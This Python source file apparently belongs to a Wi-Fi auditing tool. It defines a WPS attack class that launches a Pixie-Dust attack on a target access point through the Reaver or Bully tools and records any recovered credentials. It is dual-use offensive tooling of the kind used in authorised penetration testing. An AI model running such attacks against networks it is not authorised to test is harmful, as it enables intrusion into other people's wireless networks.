#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..util.color import Color
from ..config import Configuration

class AttackWPS(Attack):
    def __init__(self, target):
        super(AttackWPS, self).__init__(target)
        self.success = False
        self.crack_result = None

    def run(self):
        ''' Run all WPS-related attacks '''

        # Drop out if user specified to not use Reaver/Bully
        if Configuration.no_wps:
            Color.pl('\r{!} {O}--no-wps{R} set, ignoring WPS attack on {O}%s{W}' % self.target.essid)
            self.success = False
            return self.success

        if Configuration.use_bully:
            return self.run_bully()
        else:
            return self.run_reaver()

        return False


    def run_bully(self):
        # Bully: Pixie-dust
        from ..tools.bully import Bully
        bully = Bully(self.target)
        bully.run()
        bully.stop()
        self.crack_result = bully.crack_result
        self.success = self.crack_result is not None
        return self.success


    def run_reaver(self):
        from ..tools.reaver import Reaver
        reaver = Reaver(self.target)
        if not reaver.is_pixiedust_supported():
            Color.pl("{!} {R}your version of 'reaver' does not support the {O}WPS pixie-dust attack{W}")
            return False
        else:
            # Reaver: Pixie-dust
            reaver = Reaver(self.target)
            reaver.run()
            self.crack_result = reaver.crack_result
            self.success = self.crack_result is not None
            return self.success

